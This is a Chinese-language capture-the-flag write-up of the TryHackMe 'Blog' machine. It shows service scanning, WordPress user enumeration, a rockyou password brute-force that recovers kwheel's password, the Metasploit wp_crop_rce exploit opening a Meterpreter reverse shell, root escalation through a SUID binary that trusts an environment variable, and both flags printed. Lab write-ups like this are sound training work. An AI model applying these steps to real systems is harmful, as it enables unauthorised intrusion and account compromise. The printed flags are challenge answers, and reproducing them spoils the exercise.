#绑定域名
echo "10.10.122.108 blog.thm" >>/etc/hosts

#服务发现
```
┌──(root💀kali)-[~/tryhackme]
└─# nmap -sV -Pn 10.10.122.108                          
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-17 06:05 EDT
Nmap scan report for 10.10.122.108
Host is up (0.31s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.55 seconds
```



#看首页应该是一个wordpress站点，wpscan枚举这个站点信息,确认wp版本5.0
```
┌──(root💀kali)-[~/tryhackme]
└─# wpscan --url http://10.10.122.108       
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.122.108/ [10.10.122.108]
[+] Started: Fri Sep 17 06:09:45 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.122.108/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.122.108/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://10.10.122.108/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.122.108/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.122.108/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://10.10.122.108/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.0'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://10.10.122.108/, Match: 'WordPress 5.0'

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Sep 17 06:10:08 2021
[+] Requests Done: 165
[+] Cached Requests: 5
[+] Data Sent: 40.466 KB
[+] Data Received: 191.523 KB
[+] Memory used: 179.738 MB
[+] Elapsed time: 00:00:23

```

#wordpress 5.0版本存在一个远程执行漏洞
```
──(root💀kali)-[~]
└─# searchsploit wordpress 5.0
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress 5.0.0 - Image Remote Code Execution                                                                                                                                                             | php/webapps/49512.py
WordPress Core 5.0 - Remote Code Execution                                                                                                                                                                | php/webapps/46511.js
WordPress Core 5.0.0 - Crop-image Shell Upload (Metasploit)                                                                                                                                               | php/remote/46662.rb
```

看exp需要账号和密码，那么现在需要做的是确定账号和密码是什么

#枚举wp用户名
```
┌──(root💀kali)-[~]
└─# wpscan --url http://10.10.122.108 --enumerate u1-1000 

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:01:08 <==========================================================================================================================================================> (1000 / 1000) 100.00% Time: 00:01:08

[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.122.108/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.122.108/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

```

在登录框验证，正确的用户名会返回：
```ERROR: The password you entered for the username bjoel is incorrect```
错误的用户名会返回：
```ERROR: Invalid username```

经验证，```bjoel```和```kwheel```是真实存在的用户名。

#尝试爆破bjoel的wp账号,好像爆不出来

wpscan --url http://10.10.122.108 --usernames bjoel --passwords /usr/share/wordlists/rockyou.txt 


#尝试渗透445端口samba服务
```
enum4linux 10.10.122.108                                                                                                                                                                                                           255 ⨯
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Sep 17 06:31:36 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.122.108
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.10.122.108    |
 ==================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================ 
|    Nbtstat Information for 10.10.122.108    |
 ============================================ 
Looking up status of 10.10.122.108
        BLOG            <00> -         B <ACTIVE>  Workstation Service
        BLOG            <03> -         B <ACTIVE>  Messenger Service
        BLOG            <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================== 
|    Session Check on 10.10.122.108    |
 ===================================== 
[+] Server 10.10.122.108 allows sessions using username '', password ''

 =========================================== 
|    Getting domain SID for 10.10.122.108    |
 =========================================== 
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ====================================== 
|    OS information on 10.10.122.108    |
 ====================================== 
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.122.108 from smbclient: 
[+] Got OS info for 10.10.122.108 from srvinfo:
        BLOG           Wk Sv PrQ Unx NT SNT blog server (Samba, Ubuntu)
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ============================= 
|    Users on 10.10.122.108    |
 ============================= 
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ========================================= 
|    Share Enumeration on 10.10.122.108    |
 ========================================= 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        BillySMB        Disk      Billy's local SMB Share
        IPC$            IPC       IPC Service (blog server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.122.108
//10.10.122.108/print$   Mapping: DENIED, Listing: N/A
//10.10.122.108/BillySMB Mapping: OK, Listing: OK
//10.10.122.108/IPC$     [E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ==================================================== 
|    Password Policy Information for 10.10.122.108    |
 ==================================================== 


[+] Attaching to 10.10.122.108 using a NULL share

```

#//10.10.122.108/BillySMB 是可以不用密码就可以访问的
```
┌──(root💀kali)-[~/tryhackme/blog]
└─# smbclient  //10.10.122.108/BillySMB
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 17 06:31:25 2021
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

                15413192 blocks of size 1024. 9789412 blocks available

```

check-this.png 下载到本地，发现是一张二维码，解密出来是一个地址

```https://qrgo.page.link/M6dE```


在浏览器打开这个地址，跳转到了youtube页面,打开显示是Billy Joel - We Didn't Start the Fire (Official Video)
```
https://www.youtube.com/watch?v=eFTLKWw542g
```
视频标签
#BillyJoel#WeDidntStartTheFire#Rock

把这个url,标签，标题拆分成几种形式都不能登录wp后台

另外还有一张图片是Alice-White-Rabbit.jpg，难道暗示这是一个兔子洞？

还有一个mp4文件是Taylor Swift的I Knew You Were Trouble的一个恶搞片段


We Didn't Start the Fire这首歌历数了1949年-1989年世界上发生的各种大事，总体表达的是这个世界在我们来之前就糟糕透了，以后也没有变好的意思

I Knew You Were Trouble是一首流行歌曲，表达了一种我明知道你是傻逼，但是我还是爱上你了，现在我受伤了，我好疼的思想感情。

所以以上这些跟登录密码有什么关系？


#我们使用steghide（Steghide是一个可以将文件隐藏到图片或音频中的工具,析出文件用extract参数）查看文件
```
┌──(root💀kali)-[~/tryhackme/blog]
└─# steghide extract -sf Alice-White-Rabbit.jpg 
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/blog]
└─# ls
Alice-White-Rabbit.jpg  check-this.png  rabbit_hole.txt  smb.txt  tswift.mp4
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/tryhackme/blog]
└─# cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend.

```

所以整个samba服务就是一个兔子洞

#尝试爆破kwheel的用户名
```
wpscan --url http://10.10.122.108 --usernames kwheel --passwords /usr/share/wordlists/rockyou.txt 

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <=============================================================================================================================================================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - kwheel / cutiepie1                                                                                                                                                                                                              
Trying kwheel / westham Time: 00:06:33 <                                                                                                                                                           > (2865 / 14347257)  0.01%  ETA: ??:??:??
```

成功爆破到密码

因为kwheel不是站点管理员的密码，所以我们不能通过在后台修改php文件的方式反弹shell，不过按照之前的枚举5.0版本存在远程执行漏洞，我们尝试利用一下
```
msf6 exploit(multi/http/wp_crop_rce) > run

[*] Started reverse TCP handler on 10.13.21.169:4444 
[*] Authenticating with WordPress using kwheel:cutiepie1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39282 bytes) to 10.10.122.108
[*] Meterpreter session 2 opened (10.13.21.169:4444 -> 10.10.122.108:53154) at 2021-09-18 04:41:28 -0400

```

#user flag不在home目录
```
$ cat /home/bjoel/user.txt
cat /home/bjoel/user.txt
You won't find what you're looking for here.

TRY HARDER
```

#传linpeas枚举漏洞，查看可利用的SUID
```
══════════╣ SUID - Check easy privesc, exploits and write perms                                                                                                                                                                            
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                 
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                      
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh (Unknown SUID binary)
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 146K Jan 31  2020 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SUID binary)
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper (Unknown SUID binary)
-rwsr-sr-x 1 root root 107K Oct 30  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device (Unknown SUID binary)
-rwsr-xr-x 1 root root 43K Mar  5  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount (Unknown SUID binary)
-rwsr-xr-x 1 root root 27K Mar  5  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 40K Oct 10  2019 /snap/core/8268/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27K Oct 10  2019 /snap/core/8268/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/8268/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8268/usr/bin/chsh (Unknown SUID binary)
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/8268/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Oct 11  2019 /snap/core/8268/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper (Unknown SUID binary)
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/9066/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/9066/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/9066/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/9066/bin/su
-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/9066/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/9066/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/9066/usr/bin/chsh (Unknown SUID binary)
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/9066/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/9066/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)

```

#留意这一行
```-rwsr-sr-x 1 root root 8.3K May 26  2020 /usr/sbin/checker (Unknown SUID binary)```

#执行这个命令，一直返回Not an Admin
```
$ checker
checker
Not an Admin
```

#用ltrace跟踪函数调用情况
```
$ ltrace checker
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
```

发现当admin=nil时，就会返回Not an Admin

我们手动把admin的值变为1

#再次跟踪，发现流程已经导/bin/bash
```
$ export admin=1
export admin=1
$ ltrace checker
ltrace checker
getenv("admin")                                  = "1"
setuid(0)                                        = -1
system("/bin/bash"www-data@blog:/home/bjoel$ 
```


#执行checker，成功提权到root，拿到root.txt和user.txt
```
www-data@blog:/home/bjoel$ checker
checker
root@blog:/home/bjoel# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)
root@blog:/home/bjoel# cat /root/root.txt
cat /root/root.txt
9a0b2b618bef9bfa7ac28c1353d9f318
root@blog:/home/bjoel# find / -name user.txt
find / -name user.txt
/home/bjoel/user.txt
/media/usb/user.txt
find: '/proc/1457/task/1457/net': Invalid argument
find: '/proc/1457/net': Invalid argument
find: '/proc/2245/task/2245/net': Invalid argument
find: '/proc/2245/net': Invalid argument
find: '/proc/3237/task/3237/net': Invalid argument
find: '/proc/3237/net': Invalid argument
root@blog:/home/bjoel# cat /media/usb/user.txt
cat /media/usb/user.txt
c8421899aae571f7af486492b71a8ab7
```